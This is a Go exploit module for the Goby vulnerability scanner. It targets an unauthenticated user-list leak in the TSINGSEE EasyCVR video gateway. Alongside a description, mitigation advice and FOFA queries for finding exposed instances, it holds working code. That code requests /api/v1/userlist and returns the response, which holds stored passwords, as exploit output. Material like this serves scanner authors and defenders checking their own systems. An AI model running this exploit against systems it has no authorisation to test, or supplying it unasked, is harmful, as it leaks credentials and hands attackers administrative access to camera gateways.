package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "EasyCVR userlist information leakage",
    "Description": "<p>EasyCVR Intelligent Edge Gateway is a product by TSINGSEE Qingxi Video that integrates software and hardware. It provides services for device video access, capture, AI intelligent detection, processing, distribution, supporting multiple protocols such as RTSP, RTMP, GB28181, Hikvision Ehome, Dahua, Hikvision SDK, etc.</p><p>Attackers gain backend administrative privileges by constructing a specially crafted URL to read sensitive system information.</p>",
    "Impact": "<p>Attackers gain backend administrative privileges by constructing a specially crafted URL to read sensitive system information.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.tsingsee.com/download\">http://www.tsingsee.com/download</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "Product": "EasyCVR",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "EasyCVR智能边缘网关 userlist 信息泄漏漏洞",
            "Product": "EasyCVR智能边缘网关",
            "Description": "<p>EasyCVR智能边缘网关是TSINGSEE青犀视频旗下软硬一体的一款产品，可提供多协议（RTSP/RTMP/GB28181/海康Ehome/大华、海康SDK等）的设备视频接入、采集、AI智能检测、处理、分发等服务。</p><p>攻击者通过构造特殊URL地址，读取系统敏感信息获取后台管理权限。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.tsingsee.com/download\">http://www.tsingsee.com/download</a></p><p><span style=\"color: var(--primaryFont-color);\">2、通过防火墙等安全设备设置访问策略，设置白名单访问。</span></p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息获取后台管理权限。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "EasyCVR userlist information leakage",
            "Product": "EasyCVR",
            "Description": "<p>EasyCVR Intelligent Edge Gateway is a product by TSINGSEE Qingxi Video that integrates software and hardware. It provides services for device video access, capture, AI intelligent detection, processing, distribution, supporting multiple protocols such as RTSP, RTMP, GB28181, Hikvision Ehome, Dahua, Hikvision SDK, etc.</p><p>Attackers gain backend administrative privileges by constructing a specially crafted URL to read sensitive system information.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.tsingsee.com/download\" target=\"_blank\">http://www.tsingsee.com/download</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers gain backend administrative privileges by constructing a specially crafted URL to read sensitive system information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"EasyGBS\" || body=\"EasyDarwin.Body\" || body=\"EasyCVR\"",
    "GobyQuery": "body=\"EasyGBS\" || body=\"EasyDarwin.Body\" || body=\"EasyCVR\"",
    "Author": "1171373465@qq.com",
    "Homepage": "http://www.tsingsee.com/",
    "DisclosureDate": "2022-03-23",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "7.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PostTime": "2023-06-29",
    "CVSSScore": "5.6",
    "PocId": "10670"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/api/v1/userlist?pageindex=0&pagesize=10"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "assword\": \"")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/api/v1/userlist?pageindex=0&pagesize=10"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil&& strings.Contains(resp.Utf8Html, "assword\": \"") {
				expResult.Output = resp.Utf8Html
				expResult.Success = true
			}
			return expResult
		},
	))
}
